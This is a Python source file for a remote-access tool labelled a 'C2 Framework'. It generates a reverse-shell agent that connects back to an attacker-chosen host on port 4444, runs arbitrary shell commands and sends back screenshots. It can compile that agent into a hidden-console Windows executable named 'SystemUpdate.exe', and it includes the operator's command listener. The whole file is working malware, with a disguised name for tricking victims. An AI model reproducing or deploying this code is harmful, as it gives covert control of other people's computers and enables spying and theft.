import os
import sys
import base64
import socket
import subprocess
import time

# --- CONFIGURATION ---
PORT = 4444

def get_payload_code(lhost, lport):
    """The raw 'heart' of the agent with OS-detection and multimedia support"""
    return f"""
import socket, os, subprocess, time, sys, platform
try: import pyautogui
except: pyautogui = None

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("{lhost}", {lport}))
            s.send(platform.system().encode())
            
            while True:
                data = s.recv(8192).decode("utf-8")
                if not data or data.lower() == "exit":
                    s.close(); return
                
                if data == "ss":
                    if pyautogui:
                        pyautogui.screenshot("s.png")
                        with open("s.png", "rb") as f: s.send(f.read())
                        os.remove("s.png")
                    else:
                        s.send(b"ERROR: Missing pyautogui library.")
                    continue

                if data[:2] == "cd":
                    try: os.chdir(data[3:].strip())
                    except: pass
                
                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = proc.stdout.read() + proc.stderr.read()
                if not output: output = b"Command executed.\\n"
                s.send(output + b"\\n" + os.getcwd().encode() + b"> ")
        except:
            time.sleep(10)

if __name__ == "__main__":
    connect()
"""

def translate_cmd(cmd, target_os):
    if target_os.lower() == "windows":
        translations = {"ls": "dir", "cat": "type", "clear": "cls", "rm": "del", "pwd": "echo %cd%", "cp": "copy", "mv": "move", "ifconfig": "ipconfig"}
        parts = cmd.split()
        if parts[0] in translations:
            parts[0] = translations[parts[0]]
            return " ".join(parts)
    return cmd

def start_handler():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", PORT))
    server.listen(1)
    while True:
        print(f"\n[*] NEXUS-V3: Waiting for connection on port {PORT}...")
        conn, addr = server.accept()
        target_os = conn.recv(1024).decode()
        print(f"[+] CONNECTION FROM {addr[0]} ({target_os})")
        while True:
            try:
                raw_input = input(f"nexus@{addr[0]} > ").strip()
                if not raw_input: continue
                if raw_input == "ss":
                    conn.send(b"ss")
                    with open(f"ss_{int(time.time())}.png", "wb") as f:
                        f.write(conn.recv(10000000))
                    print("[+] Screenshot saved.")
                    continue
                cmd = translate_cmd(raw_input, target_os)
                conn.send(cmd.encode())
                if cmd.lower() == "exit": conn.close(); break
                data = conn.recv(16384).decode("utf-8", errors="replace")
                print(data)
            except:
                print("\n[!] Connection lost."); break

def build_py(lhost):
    code = get_payload_code(lhost, PORT)
    with open("victim_agent.py", "w") as f: f.write(code)
    print(f"\n[+] Created: victim_agent.py")

def build_exe(lhost):
    code = get_payload_code(lhost, PORT)
    with open("temp_agent.py", "w") as f:
        f.write(code)
    
    print("[*] Compiling with ZIG Compiler (Python 3.13 Fix)...")
    build_cmd = [
        sys.executable, "-m", "nuitka",
        "--onefile",
        "--windows-console-mode=disable",
        "--zig",                             # Forces use of the Zig compiler you just downloaded
        "--follow-imports",                  # Required for Onefile to actually work
        "--include-package=pyautogui",       # Specifically include the screenshot tool
        "--output-filename=SystemUpdate.exe",
        "temp_agent.py"
    ]
    
    try:
        subprocess.run(build_cmd, check=True)
        print("\n[!!!] SUCCESS: SystemUpdate.exe generated!")
        if os.path.exists("temp_agent.py"): os.remove("temp_agent.py")
    except Exception as e:
        print(f"\n[X] FAILED: {e}")

if __name__ == "__main__":
    os.system('clear' if os.name != 'nt' else 'cls')
    print("N E X U S - V 3 (C2 Framework)")
    lhost = input("LHOST (IP/Ngrok): ")
    print("\n[1] Build .py\n[2] Build .exe")
    mode = input("\nSelect Mode > ")
    if mode == "1": build_py(lhost)
    elif mode == "2": build_exe(lhost)
    start_handler()